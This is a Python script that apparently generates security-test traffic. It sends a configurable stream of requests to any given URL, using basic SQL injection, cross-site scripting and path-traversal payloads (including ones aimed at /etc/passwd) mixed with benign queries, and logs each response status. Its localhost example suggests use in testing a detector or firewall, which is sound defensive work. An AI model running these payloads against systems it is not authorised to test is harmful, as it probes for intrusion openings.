# shared/continuous_attacks.py
import requests
import random
import time
from datetime import datetime

def continuous_attack_loop(target_url, attacks_per_minute=10, duration_minutes=60):
    """Run continuous attacks for testing"""
    
    payloads = {
        'sqli': ["' OR '1'='1", "1' UNION SELECT NULL--", "admin' --"],
        'xss': ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"],
        'traversal': ["../../etc/passwd", "../../../windows/system32"],
        'normal': ["test", "search query", "hello"]
    }
    
    endpoints = ['/api/search', '/api/users', '/', '/api/admin/settings']
    
    print(f"Starting continuous attacks against {target_url}")
    print(f"Rate: {attacks_per_minute} attacks/minute")
    print(f"Duration: {duration_minutes} minutes")
    print(f"Started: {datetime.now()}\n")
    
    start_time = time.time()
    end_time = start_time + (duration_minutes * 60)
    attack_count = 0
    
    try:
        while time.time() < end_time:
            # Pick random attack
            attack_type = random.choice(list(payloads.keys()))
            payload = random.choice(payloads[attack_type])
            endpoint = random.choice(endpoints)
            
            url = f"{target_url}{endpoint}"
            
            try:
                response = requests.get(url, params={'q': payload}, timeout=5)
                status = response.status_code
            except:
                status = 'ERROR'
            
            attack_count += 1
            elapsed = int(time.time() - start_time)
            print(f"[{elapsed}s] Attack #{attack_count}: {attack_type:10} → {endpoint:25} → {status}")
            
            # Sleep to maintain rate
            time.sleep(60 / attacks_per_minute)
    
    except KeyboardInterrupt:
        print("\n\nStopped by user")
    
    total_time = time.time() - start_time
    print(f"\n{'='*70}")
    print(f"CONTINUOUS ATTACK SUMMARY")
    print(f"{'='*70}")
    print(f"Total attacks: {attack_count}")
    print(f"Total time:    {total_time:.1f}s ({total_time/60:.1f} minutes)")
    print(f"Rate:          {attack_count/total_time*60:.1f} attacks/minute")
    print(f"{'='*70}\n")

if __name__ == '__main__':
    import sys
    
    if len(sys.argv) < 2:
        print("Usage: python continuous_attacks.py <url> [attacks_per_min] [duration_min]")
        print("Example: python continuous_attacks.py http://localhost:8082 10 60")
        sys.exit(1)
    
    url = sys.argv[1]
    rate = int(sys.argv[2]) if len(sys.argv) > 2 else 10
    duration = int(sys.argv[3]) if len(sys.argv) > 3 else 60
    
    continuous_attack_loop(url, rate, duration)